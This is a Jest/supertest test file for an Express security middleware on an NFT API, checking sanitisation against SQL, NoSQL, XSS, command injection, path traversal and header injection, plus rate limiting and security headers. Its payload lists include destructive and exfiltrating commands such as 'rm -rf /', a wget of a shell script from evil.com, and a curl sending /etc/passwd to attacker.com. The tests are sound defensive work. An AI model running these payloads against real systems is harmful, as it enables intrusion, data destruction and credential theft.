import request from 'supertest';
import express from 'express';
import securityMiddleware from '../middleware/security';
import { randomBytes } from 'crypto';

describe('Security Vulnerability Scanning', () => {
  let app: express.Application;

  beforeEach(() => {
    app = express();
    app.use(express.json({ limit: '10mb' }));
    app.use(securityMiddleware);
    
    // Test routes for vulnerability testing
    app.post('/api/auth/login', (req, res) => {
      res.json({ success: true, token: 'test-token', user: req.body });
    });
    
    app.post('/api/nft/transfer', (req, res) => {
      res.json({ success: true, transaction: req.body });
    });
    
    app.get('/api/user/:id', (req, res) => {
      res.json({ success: true, user: { id: req.params.id } });
    });
    
    app.post('/api/upload', (req, res) => {
      res.json({ success: true, data: req.body });
    });
  });

  describe('SQL Injection Vulnerability Tests', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should prevent SQL injection attack ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .set('Content-Type', 'application/json')
          .send({
            username: payload,
            password: 'test'
          });

        expect(response.status).toBe(200);
        
        // Verify the payload was sanitized
        const receivedUsername = response.body.user.username;
        expect(receivedUsername).not.toContain('DROP TABLE');
        expect(receivedUsername).not.toContain('UNION SELECT');
        expect(receivedUsername).not.toContain('INSERT INTO');
        expect(receivedUsername).not.toContain('--');
        expect(receivedUsername).not.toContain('/*');
      });
    });
  });

  describe('NoSQL Injection Vulnerability Tests', () => {
    const noSQLInjectionPayloads = [
      { $where: 'function() { return true; }' },
      { $regex: '.*' },
      { $ne: null },
      { $gt: '' },
      { $exists: true },
      { $in: ['admin', 'user'] },
      { username: { $ne: null }, password: { $ne: null } },
      { $or: [{ username: 'admin' }, { role: 'admin' }] }
    ];

    noSQLInjectionPayloads.forEach((payload, index) => {
      it(`should prevent NoSQL injection attack ${index + 1}`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .set('Content-Type', 'application/json')
          .send(payload);

        expect(response.status).toBe(200);
        
        // Verify NoSQL operators were sanitized
        const responseBody = JSON.stringify(response.body);
        expect(responseBody).not.toContain('$where');
        expect(responseBody).not.toContain('$regex');
        expect(responseBody).not.toContain('$ne');
        expect(responseBody).not.toContain('$gt');
        expect(responseBody).not.toContain('$exists');
        expect(responseBody).not.toContain('$in');
        expect(responseBody).not.toContain('$or');
      });
    });
  });

  describe('XSS (Cross-Site Scripting) Vulnerability Tests', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">',
      '<div onclick="alert(1)">Click me</div>',
      '<input type="text" value="" onfocus="alert(1)" autofocus>',
      '<a href="javascript:alert(1)">Click</a>',
      '"><script>alert(1)</script>'
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should prevent XSS attack ${index + 1}: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .set('Content-Type', 'application/json')
          .send({
            username: payload,
            bio: payload
          });

        expect(response.status).toBe(200);
        
        // Verify XSS payload was sanitized
        const responseBody = JSON.stringify(response.body);
        expect(responseBody).not.toContain('<script>');
        expect(responseBody).not.toContain('onerror=');
        expect(responseBody).not.toContain('onload=');
        expect(responseBody).not.toContain('onclick=');
        expect(responseBody).not.toContain('onfocus=');
        expect(responseBody).not.toContain('javascript:');
        expect(responseBody).not.toContain('<iframe');
        expect(responseBody).not.toContain('<svg');
      });
    });
  });

  describe('Command Injection Vulnerability Tests', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(id)',
      '; ping google.com',
      '| nc -l 4444',
      '&& curl malicious-site.com',
      '; wget http://evil.com/shell.sh',
      '`curl -X POST http://attacker.com/steal --data "$(cat /etc/passwd)"`'
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection attack ${index + 1}: ${payload}`, async () => {
        const response = await request(app)
          .post('/api/upload')
          .set('Content-Type', 'application/json')
          .send({
            filename: payload,
            path: payload
          });

        expect(response.status).toBe(200);
        
        // Verify command injection was prevented
        const responseBody = JSON.stringify(response.body);
        expect(responseBody).not.toContain('ls -la');
        expect(responseBody).not.toContain('cat /etc/passwd');
        expect(responseBody).not.toContain('rm -rf');
        expect(responseBody).not.toContain('whoami');
        expect(responseBody).not.toContain('ping');
        expect(responseBody).not.toContain('curl');
        expect(responseBody).not.toContain('wget');
      });
    });
  });

  describe('Path Traversal Vulnerability Tests', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'file:///etc/passwd',
      '\\..\\..\\..\\etc\\passwd'
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should prevent path traversal attack ${index + 1}: ${payload}`, async () => {
        const response = await request(app)
          .get(`/api/user/${encodeURIComponent(payload)}`)
          .expect(200);

        // Verify path traversal was prevented
        const userId = response.body.user.id;
        expect(userId).not.toContain('../');
        expect(userId).not.toContain('..\\');
        expect(userId).not.toContain('/etc/passwd');
        expect(userId).not.toContain('windows\\system32');
        expect(userId).not.toContain('%2e%2e');
        expect(userId).not.toContain('%252f');
      });
    });
  });

  describe('HTTP Header Injection Tests', () => {
    const headerInjectionPayloads = [
      'test\r\nX-Injected-Header: malicious',
      'test\nSet-Cookie: admin=true',
      'test\r\nLocation: http://evil.com',
      'test\r\n\r\n<script>alert(1)</script>',
      'test%0d%0aX-Injected: true',
      'test%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a'
    ];

    headerInjectionPayloads.forEach((payload, index) => {
      it(`should prevent HTTP header injection attack ${index + 1}`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .set('Content-Type', 'application/json')
          .set('X-Custom-Header', payload)
          .send({ username: 'test' });

        // Should either succeed with sanitized headers or fail with 400
        expect([200, 400]).toContain(response.status);
        
        // Check that no malicious headers were injected
        expect(response.headers['x-injected-header']).toBeUndefined();
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['set-cookie']).not.toContain('admin=true');
      });
    });
  });

  describe('Large Payload DoS Tests', () => {
    it('should reject extremely large JSON payloads', async () => {
      const largePayload = {
        data: 'x'.repeat(15 * 1024 * 1024) // 15MB payload
      };

      const response = await request(app)
        .post('/api/upload')
        .set('Content-Type', 'application/json')
        .send(largePayload);

      expect(response.status).toBe(413);
      expect(response.body.error.code).toBe('REQUEST_TOO_LARGE');
    });

    it('should handle deeply nested JSON objects', async () => {
      // Create deeply nested object (potential DoS via JSON parsing)
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      const response = await request(app)
        .post('/api/upload')
        .set('Content-Type', 'application/json')
        .send(deepObject);

      // Should either handle gracefully or reject
      expect([200, 400, 413]).toContain(response.status);
    });
  });

  describe('Blockchain-Specific Security Tests', () => {
    it('should validate wallet address format', async () => {
      const invalidWalletAddresses = [
        '0x123', // Too short
        '0xGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG', // Invalid characters
        'not-a-wallet-address',
        '0x' + 'z'.repeat(40), // Invalid hex
        '', // Empty
        null,
        undefined
      ];

      for (const invalidAddress of invalidWalletAddresses) {
        const response = await request(app)
          .post('/api/nft/transfer')
          .set('Content-Type', 'application/json')
          .send({
            from: invalidAddress,
            to: '0x742d35Cc6634C0532925a3b8D0C9e3e0C8b0e8e8',
            tokenId: 123
          });

        expect(response.status).toBe(200);
        
        // Verify invalid addresses were sanitized
        if (response.body.transaction.from) {
          expect(response.body.transaction.from).not.toBe(invalidAddress);
        }
      }
    });

    it('should prevent transaction hash manipulation', async () => {
      const maliciousTxHashes = [
        '0x' + 'f'.repeat(63) + 'g', // Invalid character
        '0x123', // Too short
        'not-a-hash',
        '<script>alert(1)</script>',
        "'; DROP TABLE transactions; --"
      ];

      for (const maliciousHash of maliciousTxHashes) {
        const response = await request(app)
          .post('/api/nft/transfer')
          .set('Content-Type', 'application/json')
          .send({
            transactionHash: maliciousHash,
            tokenId: 123
          });

        expect(response.status).toBe(200);
        
        // Verify malicious content was sanitized
        const txHash = response.body.transaction.transactionHash;
        if (txHash) {
          expect(txHash).not.toContain('<script>');
          expect(txHash).not.toContain('DROP TABLE');
        }
      }
    });
  });

  describe('Authentication Security Tests', () => {
    it('should prevent timing attacks on authentication', async () => {
      const startTime = Date.now();
      
      // Test with non-existent user
      await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send({
          username: 'nonexistent-user-' + randomBytes(16).toString('hex'),
          password: 'wrong-password'
        });
      
      const nonExistentUserTime = Date.now() - startTime;
      
      const startTime2 = Date.now();
      
      // Test with potentially existing user
      await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send({
          username: 'admin',
          password: 'wrong-password'
        });
      
      const existingUserTime = Date.now() - startTime2;
      
      // Response times should be similar (within 100ms) to prevent timing attacks
      const timeDifference = Math.abs(nonExistentUserTime - existingUserTime);
      expect(timeDifference).toBeLessThan(100);
    });

    it('should prevent brute force attacks through rate limiting', async () => {
      const promises = [];
      
      // Attempt multiple rapid login requests
      for (let i = 0; i < 60; i++) {
        promises.push(
          request(app)
            .post('/api/auth/login')
            .set('Content-Type', 'application/json')
            .send({
              username: 'test-user',
              password: 'wrong-password'
            })
        );
      }
      
      const responses = await Promise.allSettled(promises);
      const successfulResponses = responses
        .filter((result): result is PromiseFulfilledResult<request.Response> => result.status === 'fulfilled')
        .map(result => result.value);
      
      // Some requests should be rate limited
      const rateLimitedResponses = successfulResponses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Data Privacy Security Tests', () => {
    it('should not leak sensitive information in error messages', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'text/plain') // Invalid content type
        .send('invalid data');

      expect(response.status).toBe(415);
      
      // Error message should not contain sensitive system information
      const errorMessage = JSON.stringify(response.body);
      expect(errorMessage).not.toMatch(/\/home\/.*\/app/); // File paths
      expect(errorMessage).not.toMatch(/node_modules/); // Internal structure
      expect(errorMessage).not.toMatch(/Error: .* at .* \(/); // Stack traces
      expect(errorMessage).not.toContain('password');
      expect(errorMessage).not.toContain('secret');
      expect(errorMessage).not.toContain('key');
    });

    it('should sanitize user data in responses', async () => {
      const sensitiveData = {
        username: 'testuser',
        password: 'secret123',
        creditCard: '4111-1111-1111-1111',
        ssn: '123-45-6789',
        privateKey: '0x' + 'a'.repeat(64)
      };

      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send(sensitiveData);

      expect(response.status).toBe(200);
      
      // Sensitive fields should not be echoed back
      const responseBody = JSON.stringify(response.body);
      expect(responseBody).not.toContain('secret123');
      expect(responseBody).not.toContain('4111-1111-1111-1111');
      expect(responseBody).not.toContain('123-45-6789');
      expect(responseBody).not.toContain('privateKey');
    });
  });

  describe('Content Security Policy Tests', () => {
    it('should set proper CSP headers', async () => {
      const response = await request(app)
        .get('/api/user/123')
        .expect(200);

      expect(response.headers['content-security-policy']).toBeDefined();
      
      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("frame-ancestors 'none'");
    });
  });

  describe('Security Headers Validation', () => {
    it('should set all required security headers', async () => {
      const response = await request(app)
        .get('/api/user/123')
        .expect(200);

      // Check for all critical security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['referrer-policy']).toBeDefined();
      expect(response.headers['x-permitted-cross-domain-policies']).toBe('none');
      expect(response.headers['x-download-options']).toBe('noopen');
    });

    it('should prevent clickjacking attacks', async () => {
      const response = await request(app)
        .get('/api/user/123')
        .expect(200);

      expect(response.headers['x-frame-options']).toBe('DENY');
      
      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("frame-ancestors 'none'");
    });
  });
});